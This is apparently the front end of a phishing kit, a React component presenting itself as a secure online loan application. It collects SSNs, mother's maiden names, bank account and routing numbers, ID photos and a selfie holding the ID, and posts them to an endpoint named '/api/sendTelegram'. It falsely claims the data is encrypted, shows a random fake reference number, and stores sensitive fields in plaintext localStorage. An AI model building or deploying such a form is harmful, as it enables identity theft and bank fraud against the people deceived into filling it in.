"use client";
import { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
 
const compressImage = (file: File): Promise<Blob> => {
    return new Promise((resolve) => {
        const reader = new FileReader();
        reader.onload = (e) => {
            const img = new Image();
            img.onload = () => {
                const canvas = document.createElement("canvas");
                const maxSize = 1000;
                let { width, height } = img;
                if (width > height && width > maxSize) {
                    height = (height * maxSize) / width;
                    width = maxSize;
                } else if (height > maxSize) {
                    width = (width * maxSize) / height;
                    height = maxSize;
                }
                canvas.width = width;
                canvas.height = height;
                canvas.getContext("2d")!.drawImage(img, 0, 0, width, height);
                canvas.toBlob((blob) => resolve(blob!), "image/jpeg", 0.75);
            };
            img.src = e.target!.result as string;
        };
        reader.readAsDataURL(file);
    });
};
 
// Upload Card Component
const UploadCard = ({
    name,
    label,
    subtitle,
    icon,
    selectedFile,
    error,
    onChange,
}: {
    name: string;
    label: string;
    subtitle: string;
    icon: React.ReactNode;
    selectedFile: File | null;
    error?: string;
    onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
}) => {
    const inputRef = useRef<HTMLInputElement>(null);
 
    return (
        <div id="loan-application" className="space-y-1">
            <p className="text-xs font-bold tracking-widest text-gray-500 uppercase">{label} <span className="text-red-500">*</span></p>
            <div
                onClick={() => inputRef.current?.click()}
                className={`cursor-pointer rounded-2xl border-2 p-6 flex flex-col items-center justify-center text-center transition-all duration-200
                    ${error ? "border-red-400 bg-red-50" : selectedFile ? "border-emerald-500 bg-emerald-50" : "border-emerald-300 bg-emerald-50 hover:border-emerald-500 hover:bg-emerald-100"}`}
            >
                <div className={`text-4xl mb-3 ${selectedFile ? "text-emerald-700" : "text-emerald-400"}`}>
                    {selectedFile ? (
                        <svg className="w-10 h-10 text-emerald-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                        </svg>
                    ) : icon}
                </div>
                <p className="font-bold text-gray-800 text-sm mb-1">
                    {selectedFile ? "File selected" : `Upload ${label.toLowerCase()}`}
                </p>
                <p className={`text-xs ${selectedFile ? "text-emerald-600 font-semibold" : "text-gray-400"}`}>
                    {selectedFile ? `✓ ${selectedFile.name.length > 30 ? selectedFile.name.substring(0, 30) + "..." : selectedFile.name}` : subtitle}
                </p>
                <input
                    ref={inputRef}
                    type="file"
                    name={name}
                    accept="image/png, image/jpeg"
                    className="hidden"
                    onChange={onChange}
                />
            </div>
            {error && <p className="text-red-500 text-xs">{error}</p>}
        </div>
    );
};
 
export default function LoanApplication() {
    const [currentStep, setCurrentStep] = useState(0);
    const [submitted, setSubmitted] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [formData, setFormData] = useState<Record<string, string | File | null>>({
        loanAmount: "",
        loanPurpose: "",
        loanTerm: "",
        fullName: "",
        ssn: "",
        dob: "",
        maritalStatus: "",
        motherMaiden: "",
        email: "",
        phone: "",
        homeAddress: "",
        employer: "",
        jobTitle: "",
        experienceYears: "",
        grossIncome: "",
        rentMortgage: "",
        creditScore: "",
        hasCreditCard: "",
        hasHomeEquity: "",
        propertyValue: "",
        bankName: "",
        accountNumber: "",
        routingNumber: "",
        idFront: null,
        idBack: null,
        selfieWithId: null,
    });
 
    const [errors, setErrors] = useState<Record<string, string>>({});
 
    const steps = [
        "Loan Details",
        "Personal Info",
        "Employment Info",
        "Bank Details",
        "Documents & Submit",
    ];
 
    useEffect(() => {
        const saved = localStorage.getItem("loanForm");
        if (saved) {
            try {
                const parsed = JSON.parse(saved);
                const safeData: Record<string, string | null> = {};
                Object.entries(parsed).forEach(([key, value]) => {
                    if (typeof value === "string" || value === null) safeData[key] = value as string | null;
                });
                setFormData((prev) => ({ ...prev, ...safeData }));
            } catch { }
        }
    }, []);
 
    useEffect(() => {
        const saveable: Record<string, string> = {};
        Object.entries(formData).forEach(([key, value]) => {
            if (typeof value === "string") saveable[key] = value;
        });
        localStorage.setItem("loanForm", JSON.stringify(saveable));
    }, [formData]);
 
    const handleNext = () => {
        if (validateStep()) setCurrentStep((prev) => prev + 1);
    };
    const handlePrev = () => setCurrentStep((prev) => prev - 1);
 
    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        const { name, value, files } = e.target as HTMLInputElement;
        if (files && files[0]) {
            const file = files[0];
            if (file.size > 20 * 1024 * 1024) {
                alert("File too large. Max 20MB.");
                return;
            }
            setFormData({ ...formData, [name]: file });
        } else {
            setFormData({ ...formData, [name]: value });
        }
    };
 
    const validateStep = () => {
        let stepErrors: Record<string, string> = {};
        switch (currentStep) {
            case 0:
                if (!formData.loanAmount) stepErrors.loanAmount = "Required";
                if (!formData.loanPurpose) stepErrors.loanPurpose = "Required";
                if (!formData.loanTerm) stepErrors.loanTerm = "Required";
                break;
            case 1:
                if (!formData.fullName) stepErrors.fullName = "Required";
                if (!formData.email) stepErrors.email = "Required";
                if (!formData.phone) stepErrors.phone = "Required";
                if (!formData.ssn) stepErrors.ssn = "Required";
                else if ((formData.ssn as string).replace(/\D/g, "").length < 9)
                    stepErrors.ssn = "SSN must be at least 9 digits";
                if (!formData.dob) stepErrors.dob = "Required";
                if (!formData.maritalStatus) stepErrors.maritalStatus = "Required";
                if (!formData.motherMaiden) stepErrors.motherMaiden = "Required";
                if (!formData.homeAddress) stepErrors.homeAddress = "Required";
                break;
            case 2:
                if (!formData.employer) stepErrors.employer = "Required";
                if (!formData.jobTitle) stepErrors.jobTitle = "Required";
                if (!formData.experienceYears) stepErrors.experienceYears = "Required";
                if (!formData.grossIncome) stepErrors.grossIncome = "Required";
                if (!formData.rentMortgage) stepErrors.rentMortgage = "Required";
                if (!formData.creditScore) stepErrors.creditScore = "Required";
                if (!formData.hasCreditCard) stepErrors.hasCreditCard = "Required";
                if (!formData.hasHomeEquity) stepErrors.hasHomeEquity = "Required";
                if (!formData.propertyValue) stepErrors.propertyValue = "Required";
                break;
            case 3:
                if (!formData.bankName) stepErrors.bankName = "Required";
                if (!formData.accountNumber) stepErrors.accountNumber = "Required";
                if (!formData.routingNumber) stepErrors.routingNumber = "Required";
                break;
            case 4:
                if (!formData.idFront) stepErrors.idFront = "Required";
                if (!formData.idBack) stepErrors.idBack = "Required";
                if (!formData.selfieWithId) stepErrors.selfieWithId = "Required";
                break;
            default:
                break;
        }
        setErrors(stepErrors);
        return Object.keys(stepErrors).length === 0;
    };
 
    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!validateStep()) return;
 
        setIsSubmitting(true);
 
        try {
            const formPayload = new FormData();
 
            for (const [key, value] of Object.entries(formData)) {
                if (value === null) continue;
                if ((value as unknown) instanceof File) {
                    const compressed = await compressImage(value as File);
                    formPayload.append(key, compressed, `${key}.jpg`);
                } else {
                    formPayload.append(key, value as string);
                }
            }
 
            const res = await fetch("/api/sendTelegram", {
                method: "POST",
                body: formPayload,
            });
 
            const text = await res.text();
            let result;
            try {
                result = JSON.parse(text);
            } catch {
                console.error("Server returned non-JSON:", text);
                alert("Upload failed. File may be too large.");
                setIsSubmitting(false);
                return;
            }
 
            if (!res.ok || !result.ok) {
                alert(`Submission failed: ${result.error || "Unknown error"}`);
                setIsSubmitting(false);
                return;
            }
 
            localStorage.removeItem("loanForm");
            setSubmitted(true);
 
        } catch (err) {
            alert(`Network error: ${(err as Error).message}`);
            setIsSubmitting(false);
        }
    };
 
    const progressPercent = ((currentStep + 1) / steps.length) * 100;
    const variants = {
        initial: { opacity: 0, x: 50 },
        animate: { opacity: 1, x: 0 },
        exit: { opacity: 0, x: -50 },
    };
 
    if (submitted) {
        return (
            <div className="max-w-3xl mx-auto p-6">
                <motion.div
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ duration: 0.5, ease: "easeOut" }}
                    className="bg-white shadow-lg border border-emerald-400 p-10 text-center rounded-sm"
                >
                    <motion.div
                        initial={{ scale: 0 }}
                        animate={{ scale: 1 }}
                        transition={{ delay: 0.2, type: "spring", stiffness: 200, damping: 15 }}
                        className="w-24 h-24 rounded-full bg-emerald-100 border-4 border-emerald-500 flex items-center justify-center mx-auto mb-6"
                    >
                        <motion.svg
                            className="w-12 h-12 text-emerald-600"
                            fill="none"
                            viewBox="0 0 24 24"
                            stroke="currentColor"
                            strokeWidth={3}
                        >
                            <motion.path
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                d="M5 13l4 4L19 7"
                                initial={{ pathLength: 0 }}
                                animate={{ pathLength: 1 }}
                                transition={{ delay: 0.5, duration: 0.6, ease: "easeInOut" }}
                            />
                        </motion.svg>
                    </motion.div>
 
                    <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}>
                        <span className="inline-flex items-center justify-center gap-2 text-xs font-semibold px-4 py-2 rounded-full mb-6  bg-blue-950 text-white shadow-sm">
                            APPLICATION RECEIVED
                        </span>
                        <h2 className="text-3xl font-bold text-emerald-700 mb-3">You&apos;re All Set!</h2>
                        <p className="text-gray-600 text-lg mb-2">Your loan application has been successfully submitted.</p>
                        <p className="text-gray-500 text-sm mb-8">
                            Our team will review your application and get back to you within{" "}
                            <span className="font-semibold text-emerald-700">24–48 hours</span>{" "}
                            via the email or phone number you provided.
                        </p>
                        <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-4 mb-8 text-left space-y-2">
                            <h3 className="font-semibold text-emerald-800 text-sm uppercase tracking-wide mb-3">What happens next?</h3>
                            {[
                                { step: "1", text: "Application review by our loan officers" },
                                { step: "2", text: "Identity & document verification" },
                                { step: "3", text: "Loan approval decision sent to your email" },
                                { step: "4", text: "Funds disbursed upon acceptance" },
                            ].map((item) => (
                                <div key={item.step} className="flex items-center gap-3">
                                    <span className="w-6 h-6 rounded-full bg-emerald-600 text-white text-xs flex items-center justify-center font-bold flex-shrink-0">{item.step}</span>
                                    <span className="text-gray-600 text-sm">{item.text}</span>
                                </div>
                            ))}
                        </div>
                        <p className="text-xs text-gray-400">
                            Reference: #{Math.random().toString(36).substring(2, 10).toUpperCase()} · Submitted{" "}
                            {new Date().toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" })}
                        </p>
                    </motion.div>
                </motion.div>
            </div>
        );
    }
 
    return (
        <div id="loan-application" className="max-w-3xl mx-auto p-6  bg-[#D4A63A]/15 shadow-lg border border-emerald-400">
            <div className="text-center">
                <span className="inline-flex items-center justify-center gap-2 text-xs font-semibold px-4 py-2 rounded-full mb-6  bg-blue-950 text-white shadow-sm mx-auto">
                    SECURE APPLICATION
                </span>
            </div>
 
            <h2 className="text-3xl font-bold mb-2 text-center text-blue-950">Start Your Loan Application</h2>
            <p className="text-center text-blue-950 mb-6">Completely online, encrypted, takes around 10 minutes.</p>
 
            <div className="relative w-full h-2 bg-white rounded-full mb-6">
                <div className="h-2  bg-blue-950 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>
 
            <div className="flex justify-between mb-6 text-sm text-blue-950 font-medium">
                {steps.map((step, idx) => (
                    <div key={idx} className={`${currentStep === idx ? "text-emerald-900 font-bold" : ""}`}>{step}</div>
                ))}
            </div>
 
            <form onSubmit={handleSubmit} className="space-y-6 relative min-h-[400px]">
                <AnimatePresence mode="wait">
                    {currentStep === 0 && (
                        <motion.div key="step1" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Loan Amount *</label>
                                <Input name="loanAmount" value={formData.loanAmount as string} onChange={handleChange} placeholder="$5000" />
                                {errors.loanAmount && <ErrorText>{errors.loanAmount}</ErrorText>}
                                <label>Loan Purpose *</label>
                                <Select name="loanPurpose" value={formData.loanPurpose as string} onChange={handleChange} options={["Education", "Car", "Home", "Business", "Medical", "Other"]} />
                                {errors.loanPurpose && <ErrorText>{errors.loanPurpose}</ErrorText>}
                                <label>Loan Term *</label>
                                <Input name="loanTerm" value={formData.loanTerm as string} onChange={handleChange} placeholder="12 months" />
                                {errors.loanTerm && <ErrorText>{errors.loanTerm}</ErrorText>}
                                <NextButton onClick={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}
 
                    {currentStep === 1 && (
                        <motion.div key="step2" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Full Legal Name *</label>
                                <Input name="fullName" value={formData.fullName as string} onChange={handleChange} placeholder="First Middle Last" />
                                {errors.fullName && <ErrorText>{errors.fullName}</ErrorText>}
                                <label>Email *</label>
                                <Input type="email" name="email" value={formData.email as string} onChange={handleChange} placeholder="your@email.com" />
                                {errors.email && <ErrorText>{errors.email}</ErrorText>}
                                <label>Phone *</label>
                                <Input type="tel" name="phone" value={formData.phone as string} onChange={handleChange} placeholder="(555)000-0000" />
                                {errors.phone && <ErrorText>{errors.phone}</ErrorText>}
                                <label>SSN *</label>
                                <Input name="ssn" value={formData.ssn as string} onChange={handleChange} placeholder="123-45-6789" />
                                {errors.ssn && <ErrorText>{errors.ssn}</ErrorText>}
                                <label>Date of Birth *</label>
                                <Input type="date" name="dob" value={formData.dob as string} onChange={handleChange} />
                                {errors.dob && <ErrorText>{errors.dob}</ErrorText>}
                                <label>Marital Status *</label>
                                <Select name="maritalStatus" value={formData.maritalStatus as string} onChange={handleChange} options={["Single", "Married", "Divorced", "Widowed", "Prefer not to say"]} />
                                {errors.maritalStatus && <ErrorText>{errors.maritalStatus}</ErrorText>}
                                <label>Mother&apos;s Maiden Name *</label>
                                <Input name="motherMaiden" value={formData.motherMaiden as string} onChange={handleChange} placeholder="Last name at birth" />
                                {errors.motherMaiden && <ErrorText>{errors.motherMaiden}</ErrorText>}
                                <label>Home Address *</label>
                                <Input name="homeAddress" value={formData.homeAddress as string} onChange={handleChange} placeholder="Street address, City, State, Zip" />
                                {errors.homeAddress && <ErrorText>{errors.homeAddress}</ErrorText>}
                                <BackNext handlePrev={handlePrev} handleNext={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}
 
                    {currentStep === 2 && (
                        <motion.div key="step3" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Present Employer *</label>
                                <Input name="employer" value={formData.employer as string} onChange={handleChange} placeholder="Company name" />
                                {errors.employer && <ErrorText>{errors.employer}</ErrorText>}
                                <label>Occupation / Job Title *</label>
                                <Input name="jobTitle" value={formData.jobTitle as string} onChange={handleChange} placeholder="e.g. Registered Nurse" />
                                {errors.jobTitle && <ErrorText>{errors.jobTitle}</ErrorText>}
                                <label>Years of Experience *</label>
                                <Select name="experienceYears" value={formData.experienceYears as string} onChange={handleChange} options={["Less than 1 year", "1 to 2 years", "3 to 5 years", "6 to 10 years", "Over 10 years"]} />
                                {errors.experienceYears && <ErrorText>{errors.experienceYears}</ErrorText>}
                                <label>Gross Monthly Income *</label>
                                <Input name="grossIncome" value={formData.grossIncome as string} onChange={handleChange} placeholder="$ e.g. 5000" />
                                {errors.grossIncome && <ErrorText>{errors.grossIncome}</ErrorText>}
                                <label>Monthly Rent / Mortgage *</label>
                                <Input name="rentMortgage" value={formData.rentMortgage as string} onChange={handleChange} placeholder="$ e.g. 1400" />
                                {errors.rentMortgage && <ErrorText>{errors.rentMortgage}</ErrorText>}
                                <label>Estimated Credit Score *</label>
                                <Select name="creditScore" value={formData.creditScore as string} onChange={handleChange} options={["300 to 499 (Poor)", "500 to 579 (Very Poor)", "580 to 660 (Fair)", "670 to 739 (Good)", "740 to 799 (Very Good)", "800 to 850 (Exceptional)"]} />
                                {errors.creditScore && <ErrorText>{errors.creditScore}</ErrorText>}
                                <label>Do you have a credit card? *</label>
                                <Select name="hasCreditCard" value={formData.hasCreditCard as string} onChange={handleChange} options={["Yes", "No", "Prefer not to say"]} />
                                {errors.hasCreditCard && <ErrorText>{errors.hasCreditCard}</ErrorText>}
                                <label>Do you have home equity? *</label>
                                <Select name="hasHomeEquity" value={formData.hasHomeEquity as string} onChange={handleChange} options={["Yes", "No", "Not sure"]} />
                                {errors.hasHomeEquity && <ErrorText>{errors.hasHomeEquity}</ErrorText>}
                                <label>Estimated Property Value *</label>
                                <Input name="propertyValue" value={formData.propertyValue as string} onChange={handleChange} placeholder="A value or none" />
                                {errors.propertyValue && <ErrorText>{errors.propertyValue}</ErrorText>}
                                <BackNext handlePrev={handlePrev} handleNext={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}
 
                    {currentStep === 3 && (
                        <motion.div key="step4" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                <label>Bank / Financial Institution *</label>
                                <Input name="bankName" value={formData.bankName as string} onChange={handleChange} placeholder="e.g. JPMorgan Chase, Bank of America" />
                                {errors.bankName && <ErrorText>{errors.bankName}</ErrorText>}
                                <label>Checking Account Number *</label>
                                <Input name="accountNumber" value={formData.accountNumber as string} onChange={handleChange} placeholder="Your full account number" />
                                {errors.accountNumber && <ErrorText>{errors.accountNumber}</ErrorText>}
                                <label>Bank Routing Number *</label>
                                <Input name="routingNumber" type="number" value={formData.routingNumber as string} onChange={handleChange} placeholder="9-digit ABA routing number" />
                                {errors.routingNumber && <ErrorText>{errors.routingNumber}</ErrorText>}
                                <BackNext handlePrev={handlePrev} handleNext={handleNext} />
                            </StepContainer>
                        </motion.div>
                    )}
 
                    {currentStep === 4 && (
                        <motion.div key="step5" variants={variants} initial="initial" animate="animate" exit="exit" transition={{ duration: 0.3 }}>
                            <StepContainer>
                                {/* Header */}
                                <div className="mb-2">
                                    <h3 className="text-xl font-bold text-gray-800">Identity Documents</h3>
                                    <p className="text-sm text-gray-400 mt-1">JPG or PNG format, max 20MB each</p>
                                </div>
                                <hr className="border-gray-200 mb-4" />
 
                                <UploadCard
                                    name="idFront"
                                    label="Government ID — Front"
                                    subtitle="Driver's license, passport, or state ID"
                                    selectedFile={formData.idFront as File | null}
                                    error={errors.idFront}
                                    onChange={handleChange}
                                    icon={
                                        <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                                            <rect x="2" y="5" width="20" height="14" rx="2" strokeLinecap="round" strokeLinejoin="round" />
                                            <circle cx="8" cy="12" r="2" strokeLinecap="round" />
                                            <path strokeLinecap="round" strokeLinejoin="round" d="M12 10h6M12 14h4" />
                                        </svg>
                                    }
                                />
 
                                <UploadCard
                                    name="idBack"
                                    label="Government ID — Back"
                                    subtitle="Reverse side of the same document"
                                    selectedFile={formData.idBack as File | null}
                                    error={errors.idBack}
                                    onChange={handleChange}
                                    icon={
                                        <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                                            <rect x="2" y="5" width="20" height="14" rx="2" strokeLinecap="round" strokeLinejoin="round" />
                                            <path strokeLinecap="round" strokeLinejoin="round" d="M7 9h10M7 13h6M7 17h4" />
                                        </svg>
                                    }
                                />
 
                                <UploadCard
                                    name="selfieWithId"
                                    label="Selfie Holding Your ID"
                                    subtitle="Hold ID clearly visible next to your face in good lighting"
                                    selectedFile={formData.selfieWithId as File | null}
                                    error={errors.selfieWithId}
                                    onChange={handleChange}
                                    icon={
                                        <svg className="w-10 h-10" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                                            <path strokeLinecap="round" strokeLinejoin="round" d="M15 10a3 3 0 11-6 0 3 3 0 016 0z" />
                                            <path strokeLinecap="round" strokeLinejoin="round" d="M6.5 20a5.5 5.5 0 0111 0H6.5z" />
                                            <path strokeLinecap="round" strokeLinejoin="round" d="M3 7h2l1-2h12l1 2h2a1 1 0 011 1v11a1 1 0 01-1 1H3a1 1 0 01-1-1V8a1 1 0 011-1z" />
                                        </svg>
                                    }
                                />
 
                                <div className="flex justify-between mt-6">
                                    <button type="button" onClick={handlePrev} className="px-6 py-3  bg-blue-950 rounded-lg font-medium">Back</button>
                                    <button
                                        type="submit"
                                        disabled={isSubmitting}
                                        className="px-6 py-3  bg-blue-950 text-white rounded-lg hover: bg-blue-950  disabled:opacity-60 disabled:cursor-not-allowed flex items-center gap-2 font-medium"
                                    >
                                        {isSubmitting ? (
                                            <>
                                                <svg className="animate-spin w-4 h-4" fill="none" viewBox="0 0 24 24">
                                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z" />
                                                </svg>
                                                Submitting...
                                            </>
                                        ) : "Submit Application"}
                                    </button>
                                </div>
                            </StepContainer>
                        </motion.div>
                    )}
                </AnimatePresence>
            </form>
        </div>
    );
}
 
// --- Helper Components ---
const StepContainer = ({ children }: { children: React.ReactNode }) => <div className="space-y-4 p-2">{children}</div>;
 
const Input = ({ type = "text", ...props }: any) => (
    <input
        type={type}
        className="w-full p-3 border-2 border-indigo-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-400 bg-white"
        {...props}
    />
);
 
const Select = ({ options = [], ...props }: any) => (
    <select
        className="w-full p-3 border-2 border-indigo-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-emerald-400 bg-white"
        {...props}
    >
        <option value="">Select</option>
        {options.map((opt: string, idx: number) => (
            <option key={idx} value={opt}>{opt}</option>
        ))}
    </select>
);
 
const NextButton = ({ onClick }: { onClick: () => void }) => (
    <button type="button" onClick={onClick} className="px-6 py-3  bg-blue-950 text-white rounded-lg hover: bg-blue-950">Continue</button>
);
 
const BackNext = ({ handlePrev, handleNext }: { handlePrev: () => void; handleNext: () => void }) => (
    <div className="flex justify-between mt-4">
        <button type="button" onClick={handlePrev} className="px-6 py-3 bg-blue-950 rounded-lg">Back</button>
        <button type="button" onClick={handleNext} className="px-6 py-3 bg-blue-950 text-white rounded-lg hover: bg-blue-950">Continue</button>
    </div>
);
 
const ErrorText = ({ children }: { children: React.ReactNode }) => <p className="text-red-600 text-sm">{children}</p>;
